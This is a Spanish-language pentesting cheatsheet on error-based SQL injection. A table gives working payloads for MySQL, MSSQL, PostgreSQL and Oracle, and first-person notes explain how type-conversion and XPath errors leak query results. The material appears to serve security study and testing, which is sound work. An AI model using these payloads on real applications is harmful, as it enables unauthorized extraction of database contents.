---
aliases:
tags:
  - type/cheatsheet
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[SQL Injection (SQLi)]]"
---
# SQLI - Error based

***

## Cheatsheet

|**SGBD**|**Función / Vector**|**Payload Estructural**|**Notas de Exfiltración**|
|---|---|---|---|
|[[MySQL]]|`EXTRACTVALUE()`|`AND extractvalue(rand(),concat(0x3a,(SELECT version())))`|Límite de 32 caracteres por error. Retorna el resultado en el mensaje de validación XPath.|
|[[MySQL]]|`UPDATEXML()`|`AND updatexml(rand(),concat(0x3a,(SELECT version())),rand())`|Límite de 32 caracteres. Alternativa directa a extractvalue.|
|[[MSSQL]]|`CONVERT()`|`AND 1=(SELECT CONVERT(int,(SELECT @@version)))`|Fuerza un error de conversión de tipos (ej. de varchar a int). El valor exfiltrado aparece en el error de casteo.|
|[[MSSQL]]|`CAST()`|`AND 1=CAST((SELECT @@version) AS int)`|Mecanismo homólogo a CONVERT.|
|[[PostgreSQL]]|`CAST()`|`AND 1=CAST((SELECT version()) AS numeric)`|Error al intentar convertir una cadena de texto a un valor numérico.|
|[[Oracle]]|`UTL_INADDR`|`AND 1=UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE rownum=1))`|El error se genera al fallar la resolución DNS de un hostname compuesto por la subconsulta.|

## Overview

El [[Error-based SQLi]] es una técnica de inyección de tipo In-Band donde dependo de los mensajes de error emitidos por el motor de la base de datos para exfiltrar información sobre su estructura o el contenido de sus tablas. A diferencia del [[Union-based SQLi]], no requiero que el resultado de mi consulta se refleje de manera natural en el cuerpo de la respuesta web, sino que fuerzo una excepción lógica, matemática o sintáctica cuyo volcado de error incluya los datos procesados de mi subconsulta.

La viabilidad de este vector está estrictamente condicionada a la configuración del entorno: requiere que la aplicación web no maneje las excepciones de forma segura y exponga los errores crudos del SGBD (verbose errors) en el frontend o en las respuestas HTTP.

### Mecanismos de Acción

- **Errores de Conversión (Type Casting):** Intento convertir deliberadamente una cadena de texto (que evalúa mi consulta inyectada) en un tipo de dato incompatible, usualmente un entero. El motor arrojará una excepción indicando que "no se pudo convertir la cadena 'MIS_DATOS_EXFILTRADOS' al tipo int", revelando así la información.
- **Errores de Evaluación XPath:** En motores como MySQL, empleo funciones que procesan XML inyectando subconsultas en parámetros que esperan rutas XPath válidas. Al concatenar un carácter inválido (como `0x3a` o `:`) seguido de la consulta, la validación falla y devuelve la ruta procesada como parte del mensaje de error.


***
